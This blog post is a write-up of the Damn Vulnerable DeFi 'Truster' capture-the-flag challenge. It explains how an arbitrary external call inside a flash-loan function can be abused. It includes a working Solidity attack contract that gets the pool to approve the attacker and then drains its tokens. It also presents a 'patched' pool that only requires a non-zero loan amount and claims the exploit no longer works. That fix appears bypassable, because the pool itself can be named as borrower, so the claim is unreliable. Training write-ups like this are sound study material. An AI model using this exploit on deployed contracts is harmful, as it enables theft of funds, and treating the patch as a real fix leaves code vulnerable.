---
layout: post
title: Damn Vulnerable DeFi - Truster
---

## Description
More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

Currently the pool has 1 million DVT tokens in balance. And you have nothing.

But don't worry, you might be able to take them all from the pool. In a single transaction.

## Solution
How might we approach this one? The `balanceAfter >= balanceBefore` check looks solid,
which means no matter what we'll have to return the tokens...

Let's turn our attention to `target.functionCall(data)` next. Notice that
both `target` and `data` arbitrary. Combine that with our knowledge of the ERC20
interface, and we can call the `approve` function to give the attacker permission to transfer
tokens on behalf of the Pool.

But wait, what about returning the tokens? We don't need to if we flashloan an amount of 0.

```
contract TrusterAttack {
    function attack(
        address trusterLenderPool,
        address damnValuableToken,
        uint256 amount
    ) external {
        bytes memory targetData = abi.encodeWithSelector(IERC20(damnValuableToken).approve.selector, address(this), amount);
        TrusterLenderPool(trusterLenderPool).flashLoan(0, address(this), damnValuableToken, targetData);
        IERC20(damnValuableToken).transferFrom(trusterLenderPool, msg.sender, amount);
    }
}
```

## Patched Contract
We can prevent this exploit if we revert when the borrow amout is 0. By enforcing a non-zero
loan amount, our `target.functionCall(data)` MUST return the tokens. Which obviously means we can't just call `approve` on the DVT contract. 

The fix is a one liner `require(borrowAmount > 0, "0 amount");`

```
contract TrusterLenderPoolV2 is ReentrancyGuard {

    using Address for address;

    IERC20 public immutable damnValuableToken;

    constructor (address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        require(borrowAmount > 0, "0 amount");
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
}
```

You can verify yourself that the exploit no longer works with `TrusterLenderPoolV2`!